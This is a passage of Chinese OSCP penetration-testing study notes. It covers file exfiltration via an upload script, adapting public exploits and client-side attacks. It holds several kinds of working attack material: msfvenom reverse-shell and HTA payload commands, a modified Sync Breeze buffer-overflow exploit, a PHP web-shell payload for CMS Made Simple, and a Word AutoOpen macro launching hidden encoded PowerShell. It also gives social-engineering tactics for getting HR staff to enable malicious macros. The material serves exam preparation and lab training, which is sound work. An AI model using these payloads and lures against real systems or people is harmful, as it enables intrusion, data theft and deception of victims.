class="hljs-string">&#x27;/var/www/uploads/&#x27;</span>;<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li>创建目录接收文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:/var/www$ sudo <span class="hljs-built_in">mkdir</span> /var/www/uploads<br>kali@kali:/var/www$ ps -ef | grep apache<br>root 1946 1 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start www-data 1947 1946 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start<br>kali@kali:/var/www$ sudo <span class="hljs-built_in">chown</span> www-data: /var/www/uploads<br>kali@kali:/var/www$ <span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x 4 root root<br>drwxr-xr-x 13 root root<br>drwxr-xr-x 2 root root<br>drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:33 uploads<br></code></pre></td></tr></table></figure></li><li>从Windows主机上传到kali<ul><li><code>C:\Users\0ffsec&gt; powershell (New-0bject System.Net.WebClient).UploadFile(&#39;http://10.11.0.4/upload.php&#39;, &#39;important.docx&#39;)</code></li></ul></li></ul><h3 id="其他方法传输文件"><a href="#其他方法传输文件" class="headerlink" title="其他方法传输文件"></a>其他方法传输文件</h3><ul><li><p>certutil</p><ul><li>certutil.exe -urlcache -split -f “<a href="https://10.0.2.15/files/nc.zip&quot;">https://10.0.2.15/files/nc.zip&quot;</a> nc.zip</li></ul></li><li><p>rdesktop.</p><ul><li>远程桌面连接同时挂载共享文件夹</li><li><code>rdesktop -u user a.b.c.d -p pass -g 1200x900 -x 0x80 -r sound:local -r disk:LinuxPictures=/home/user/Pictures</code></li><li><code>xfreerdp /u:user /p:pass /w:1200 /h:900 /v:10.0.2.5 /drive:drive1,/home/kali</code></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修复EXP代码</title>
    <link href="/2022/08/16/%E4%BF%AE%E5%A4%8DEXP%E4%BB%A3%E7%A0%81/"/>
    <url>/2022/08/16/%E4%BF%AE%E5%A4%8DEXP%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="修复EXP代码"><a href="#修复EXP代码" class="headerlink" title="修复EXP代码"></a>修复EXP代码</h3><ul><li>修复EXP代码是渗透测试人员的一种能力要求<ul><li>自己写EXP代码往往非常耗时, 和搜索一个符合当前环境的EXP同样困难、耗时</li></ul></li><li>公开的EXP往往只针对具体版本的系统和软件环境<ul><li>将其用于其他软件环境时可能造成崩溃、锁死目标主机</li></ul></li><li>针对同一漏洞, Exploit-DB可能存在多个EXp<ul><li>目的是适用于不同版本的软件环境</li></ul></li></ul><h2 id="修复内存污染EXP"><a href="#修复内存污染EXP" class="headerlink" title="修复内存污染EXP"></a>修复内存污染EXP</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li><p>缓冲区溢出EXP通常较难修改且复杂</p></li><li><p>没有 DEP 和 ASLR 等技术时流程相对清晰</p><ol><li>创建一个大缓冲区来触发溢出</li><li>通过用适当的偏移量填充大缓冲区来覆盖堆栈上的返回地址来控制 EIP</li><li>在缓冲区中注入Payload，并前置一个可选的 NOP sled。</li><li>选择正确的指令，例如 JMP ESP（或其他的寄存器），以便将执行流重定向到Payload。</li></ol></li><li><p>按照目标系统软件环境修改</p><ul><li>文件路径、IP地址、端口、URL、偏移量、返回地址、跳转指令(DLL)等</li><li>修改Palyoad(反弹IP、端口、坏字符), 部分情况下只能逆向分析</li></ul></li></ul><h3 id="检查EXP"><a href="#检查EXP" class="headerlink" title="检查EXP"></a>检查EXP</h3><ul><li>Sync Breeze另一个EXP, 搜索已知漏洞<ul><li><code>kali@kali:~$ searchsploit &quot;Sync Breeze Enterprise 10.0.28&quot;</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816235000.png"></li><li>C语言版本EXP适用于没有python解释器的场景(PyInstaller)</li></ul></li><li>将EXP源码拷贝到当前目录<ul><li><code>kali@kali:~$ searchsploit -m 42341</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816235330.png"></li></ul></li></ul><h3 id="跨平台编译"><a href="#跨平台编译" class="headerlink" title="跨平台编译"></a>跨平台编译</h3><ul><li>在考虑编译之前，我们注意到头文件（例如 winsock2.h381）表明此代码是要在 Windows 上编译的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br></code></pre></td></tr></table></figure></li><li>交叉编译漏洞利用代码<ul><li>mingw-64 交叉编译器</li><li><code>kali@kali:~$ sudo apt install mingw-w64</code></li></ul></li><li>将源码编译为标准PE文件<ul><li><code>kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe  # 报错</code></li><li><code>kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</code></li></ul></li></ul><h3 id="修正代码"><a href="#修正代码" class="headerlink" title="修正代码"></a>修正代码</h3><ul><li><p>修改硬编码Ip、端口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] Socket created.\n&quot;</span>);<br>server.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;10.11.0.22&quot;</span>);<br>server.sin_family = AF_INET;<br>server.sin_port = htons(<span class="hljs-number">80</span>);<br></code></pre></td></tr></table></figure></li><li><p>修正返回地址</p><ul><li>对代码的进一步检查发现使用了位于 msvbvm60.dll 中的返回地址，该地址不是易受攻击的软件的一部分。查看 Windows 客户端调试器中加载的模块，我们注意到该 DLL 不存在，这意味着返回地址对我们的目标无效。</li><li>鉴于我们之前的模块已经有一个有效的漏洞利用，我们可以用我们自己的替换目标返回地址，这是有效的。</li><li><code>unsigned char retn[] = &quot;\x83\x0c\x09\x10&quot;; // 0x10090c83</code></li><li>或者可以搜索别人针对此漏洞已经发现的返回地址(其他系统、内存安全技术)</li></ul></li><li><p>生成并替换payload</p><ul><li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC= thread -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x25\x26\x2b\3d&quot;</code></li></ul></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li><p>代码修正后编译</p><ul><li><code>kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</code></li></ul></li><li><p>执行exp(崩溃)</p><ul><li><code>kali@kali:~/Desktop$ wine exploit.exe</code></li></ul></li><li><p>分析EIP和缓冲区数据, 发现偏移量相差一个字节<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817004523.png"></p></li><li><p>调整偏移量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> initial_buffer_size = <span class="hljs-number">781</span>;<br><span class="hljs-type">char</span> *padding = <span class="hljs-built_in">malloc</span>(initial_buffer_size);<br><span class="hljs-built_in">memset</span>(padding, <span class="hljs-number">0x41</span>, initial_buffer_size);<br><span class="hljs-built_in">memset</span>(padding + initial_buffer_size - <span class="hljs-number">1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></li></ul><ol><li>重新编译</li><li>开启侦听反弹连接</li><li>执行exp<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817004940.png"></li></ol><h2 id="WEB-EXP修复"><a href="#WEB-EXP修复" class="headerlink" title="WEB EXP修复"></a>WEB EXP修复</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>WEB漏洞利用通常不会造成内存污染, 因此也不受内存保护机制影响</li><li>修改WEB EXP关注以下:<ol><li>协议位HTTP&#x2F;HTTPS</li><li>是否需要访问特定路径或路由</li><li>身份认证前是否可利用漏洞</li><li>若否, 使用何种身份认证方式</li><li>GET&#x2F;POST</li><li>是否依赖程序默认设置(可能默认配置被修改)</li><li>自签名证书等问题是否影响漏洞</li></ol></li></ul><h3 id="修复案例"><a href="#修复案例" class="headerlink" title="修复案例"></a>修复案例</h3><ul><li><p>假设</p><ul><li>发现 Linux + Apache + CMS Made Simple version 2.2.5 listening on TCP port 443.</li><li>搜索发现EXP代码44976.py(需要认证)</li><li>在其他主机商发现可用账号密码admin:Passw0rd</li></ul></li><li><p>修正URL</p><ul><li><code>base_url = &quot;http://192.168.1.10/cmsms/admin&quot;</code></li><li><code>base_url = &quot;https://10.11.0.128/admin&quot;</code></li></ul></li><li><p>修正默认账号密码<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817005634.png"></p></li><li><p>修正证书报错</p><ul><li><code>response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, v erify=False)</code></li></ul></li><li><p>payload无需修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">php_filename = <span class="hljs-string">&#x27;shell.php&#x27;</span><br>payload = <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>修复参数分割符</p><ul><li><code>https://10.11.0.128/admin?_sk_=f2946ad9afceb247864</code></li><li><code>csrf_param = &quot;_sk_&quot;</code></li></ul></li><li><p>执行EXP<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817010001.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索已知EXP</title>
    <link href="/2022/08/16/%E6%90%9C%E7%B4%A2%E5%B7%B2%E7%9F%A5EXP/"/>
    <url>/2022/08/16/%E6%90%9C%E7%B4%A2%E5%B7%B2%E7%9F%A5EXP/</url>
    
    <content type="html"><![CDATA[<h1 id="搜索已知EXP"><a href="#搜索已知EXP" class="headerlink" title="搜索已知EXP"></a>搜索已知EXP</h1><h2 id="风险提醒"><a href="#风险提醒" class="headerlink" title="风险提醒"></a>风险提醒</h2><ul><li>使用来自网络的EXP代码之前, 需要仔细检查代码内容, 例如Publisher<ul><li><a href="https://www.soldierx.com/bbs/0pen0wnc-anti-sec-group-Lol">https://www.soldierx.com/bbs/0pen0wnc-anti-sec-group-Lol</a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (geteuid()) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Root is required for raw sockets, etc.&quot;</span>); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>&#125;<br><br>[...]<br><span class="hljs-type">char</span> jmpcode[] =<br><span class="hljs-string">&quot;\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f&quot;</span> <span class="hljs-string">&quot;\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26&quot;</span>;<br>[...]<br></code></pre></td></tr></table></figure></li></ul></li><li>需要ROOT权限十分可疑；解码十六进制payload, 发现rm -rf &#x2F;* 2&gt; &#x2F;dev&#x2F;null &amp;<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816222825.png"></li></ul><h2 id="搜索EXP"><a href="#搜索EXP" class="headerlink" title="搜索EXP"></a>搜索EXP</h2><h3 id="Exploit-DB"><a href="#Exploit-DB" class="headerlink" title="Exploit-DB"></a>Exploit-DB</h3><ul><li>Exploit-DB是由Offensive Security维护的漏洞库, 并提供漏洞版本软件, 供研究使用<ul><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com</a><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816223248.png"></li></ul></li></ul><h3 id="SecurityFocus"><a href="#SecurityFocus" class="headerlink" title="SecurityFocus"></a>SecurityFocus</h3><ul><li><p>1999年建立, 关注一些重要的安全领域</p><ul><li><a href="https://www.securityfocus.com/">https://www.securityfocus.com</a></li><li>BugTraq: 一个完整的公开邮件列表, 目的是讨论和宣布安全漏洞</li><li>SecurityFocus Vulnerability Database: 提供有关所有平台和服务漏洞的最新信息。</li><li>SecurityFocus Mailing Lists: 基于主题的邮件列表允许世界各地的研究人员讨论各种安全问题</li></ul></li><li><p>Packet Storm</p><ul><li>提供关于安全新闻和漏洞的最新信息, 以及安全供应商发布的工具</li><li><a href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a></li></ul></li><li><p>Google</p><ul><li><code>firefox --search &quot;Microsoft Edge site:exploit-db.com&quot;</code></li><li><code>inurl, intext, intitle</code></li></ul></li></ul><h2 id="离线搜索EXP"><a href="#离线搜索EXP" class="headerlink" title="离线搜索EXP"></a>离线搜索EXP</h2><h3 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h3><ul><li>升级本地Exploit-DB数据库<ul><li><code>sudo apt update &amp;&amp; sudo apt install exploitdb</code></li></ul></li><li>搜索所有针对 Windows 操作系统的SMB 服务的远程利用EXP<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816225328.png"></li></ul><h3 id="其他漏洞搜索来源"><a href="#其他漏洞搜索来源" class="headerlink" title="其他漏洞搜索来源"></a>其他漏洞搜索来源</h3><ul><li>NMAP脚本<ul><li><code>kali@kali:~$ cd /usr/share/nmap/scripts</code></li><li><code>kali@kali:/usr/share/nmap/scripts$ grep Exploits *.nse</code></li></ul></li><li>脚本信息<ul><li><code>kali@kali:~$ nmap --script-help=clamav-exec.nse</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230210.png"></li></ul></li><li>客户端漏洞BeFF(The Browser Exploitation Framework)<ul><li><code>kali@kali:~$ sudo beef-xss</code></li><li><a href="http://127,0,0,1:3000/ui/panel">http://127,0,0,1:3000/ui/panel</a>  # beef:beef<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230149.png"></li></ul></li><li>Metasploit<ul><li><code>sudo msfconsole -q</code></li><li><code>msf &gt; search ms08_067</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230345.png"></li></ul></li></ul><h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ul><li><p>模拟真实目标渗透过程</p><ul><li>&#96;&#96;&#96;kali@kali:~# sudo nmap 10.11.0.128 -p- -sV -vv –open –reason&#96;<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230609.png"></li></ul></li><li><p>针对扫描发现的应用版本, 搜索已知漏洞<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230747.png"></p></li><li><p>利用EXP攻击目标主机<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816230935.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>客户端攻击</title>
    <link href="/2022/08/16/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/"/>
    <url>/2022/08/16/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><ul><li><p>客户端攻击, 攻击客户端软件漏洞</p><ul><li>浏览器、PDF、OFFICE等软件</li><li>不需要与被攻击者直接路由可达</li></ul></li><li><p>通过邮件附件或恶意链接, 欺骗被害者访问</p><ul><li>被害者一旦出发攻击代码, 主动建立反弹</li></ul></li></ul><h2 id="了解攻击目标"><a href="#了解攻击目标" class="headerlink" title="了解攻击目标"></a>了解攻击目标</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li><p>客户端攻击的主要难点是枚举目标。不变的方法仍然是主动、被动信息收集；</p></li><li><p>被动 客户端信息</p><ol><li>发现目标公司出口IP</li><li>建立站点, 诱骗目标公司员工访问, 通过IP、User-Agent发现目标公司员工OS、浏览器版本</li><li>通过论坛和社交媒体图片分享获得相关信息</li><li>针对客户端软件版本定制攻击代码</li></ol></li><li><p>主动客户端信息收集</p><ol><li>与目标进行交互(演技)</li><li>邮件(链接、附件、文档)、社交媒体、电话社工、获取OS、APPs、AVs、浏览器插件信息</li></ol></li><li><p>社工与客户端攻击</p><ol><li>向HR发送无法打开的简历, 如HR要求重发简历, 则询问其使用的Office、OS、AV版本软件</li><li>声称简历用了高级的宏特性, 使得简历更美观、易于查看, 要求HR允许执行宏(宏恶意代码)</li></ol></li><li><p>客户端指纹信息</p><ol><li>浏览器功能特性丰富复杂, 这是双刃剑, 给攻击者提供更多攻击面, 是首选的攻击目标</li><li>诱骗被攻击者访问攻击者搭建的网站, 以此了解目标OS、浏览器版本信息</li><li>利用js收集客户端信息(Fingerprintjs2)</li></ol></li><li><p>使用fingerprintjs2<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816203330.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Blank Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You have been given the finger!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fingerprint2.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> d1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();</span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> options = &#123;&#125;;</span><br><span class="language-javascript">  <span class="hljs-title class_">Fingerprint2</span>.<span class="hljs-title function_">get</span>(options, <span class="hljs-keyword">function</span> (<span class="hljs-params">components</span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> values = components.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">component</span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> component.<span class="hljs-property">value</span></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> murmur = <span class="hljs-title class_">Fingerprint2</span>.<span class="hljs-title function_">x64hash128</span>(values.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>), <span class="hljs-number">31</span>)</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> clientfp = <span class="hljs-string">&quot;Client browser fingerprint: &quot;</span> + murmur + <span class="hljs-string">&quot;\n\n&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> d2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> timeString = <span class="hljs-string">&quot;Time to calculate fingerprint: &quot;</span> + (d2 - d1) + <span class="hljs-string">&quot;ms\n\n&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> details = <span class="hljs-string">&quot;Detailed information: \n&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">console</span> !== <span class="hljs-string">&quot;undefined&quot;</span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> index <span class="hljs-keyword">in</span> components) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> obj = components[index];</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> value = obj.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">null</span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">var</span> line = obj.<span class="hljs-property">key</span> + <span class="hljs-string">&quot; = &quot;</span> + value.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">150</span>);</span><br><span class="language-javascript">          details += line + <span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">    xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/fp/js.php&quot;</span>);</span><br><span class="language-javascript">    xmlhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/txt&quot;</span>);</span><br><span class="language-javascript">    xmlhttp.<span class="hljs-title function_">send</span>(clientfp + timeString + details);</span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>fingerprintjs3</p><ul><li>用于支持IE11等旧版本的浏览器</li></ul></li></ul><h2 id="HTA程序"><a href="#HTA程序" class="headerlink" title="HTA程序"></a>HTA程序</h2><h3 id="HTA程序-1"><a href="#HTA程序-1" class="headerlink" title="HTA程序"></a>HTA程序</h3><ul><li>将html拓展名改为.hta, IE会将其作为HTML应用程序解析执行</li><li>在浏览器之外运行, 使用mshta.exe执行此程序</li><li>兼容ActiveX等遗留技术, 支持js、vbs脚本, 可执行任意程序</li><li>此攻击只针对IE, Edge有效</li><li>生成攻击代码<ul><li><code>sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta</code></li></ul><ol><li>通过Windows脚本引擎的run方法执行Powershell</li><li>-nop (NoProfile) 指示PowerShell不要加载用户配置文件(默认配置影响代码执行, 因此禁用)</li><li>-w hidden (-WindowStyle hidden) 禁止在用户桌面打开新窗口</li><li>-e (-EncodedCommand) Base64编码的Powershell脚本<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816211151.png"></li></ol></li></ul><h2 id="利用Office攻击"><a href="#利用Office攻击" class="headerlink" title="利用Office攻击"></a>利用Office攻击</h2><h3 id="Office宏"><a href="#Office宏" class="headerlink" title="Office宏"></a>Office宏</h3><ul><li>利用客户端日常使用的受信软件漏洞, 攻击更隐蔽、成功概率更高</li><li>利用宏执行VBA代码, VBA是全功能的脚本语言, 支持ActivX、Windows脚本主机</li><li>安装Office2016, 创建Word文档, 添加宏<ul><li>视图 &#x3D;&gt; 宏 &#x3D;&gt; 宏名 &#x3D;&gt; 位置 &#x3D;&gt; 创建 &#x3D;&gt; 编辑 &#x3D;&gt; 代码</li><li>宏默认不会运行, 得开启</li><li>文档保存为.doc或.docm</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816211919.png"></p><ul><li>被攻击者需要启用宏, 代码才会执行<ul><li>可利用文档内容诱骗和鼓励被害者启用宏<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220816211941.png"></li></ul></li></ul><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><ul><li>VBA字符串有长度限制, 最大255个字符, 但字符串变量的长度没有限制<ul><li>因此需要先将payload分割成多段较短的字符串, 然后再拼接执行</li></ul></li><li>生成反弹shell代码<ul><li><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta</code></li><li>使用python分割payload</li><li>修改并插入代码</li><li><code>nc -nvlp 4444</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span><br>n = <span class="hljs-number">50</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Str = Str + &quot;</span> + <span class="hljs-string">&quot;&quot;</span> + <span class="hljs-built_in">str</span>[i:i+n] + <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> AutoOpen()<br>    MyMacro<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> Document_Open()<br>    MyMacro<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> MyMacro()<br>    <span class="hljs-keyword">Dim</span> Str <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>    # 这里是msfvemon生成的payload<br>    Str = <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ&quot;</span><br>    Str = Str + <span class="hljs-string">&quot;QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB&quot;</span><br> 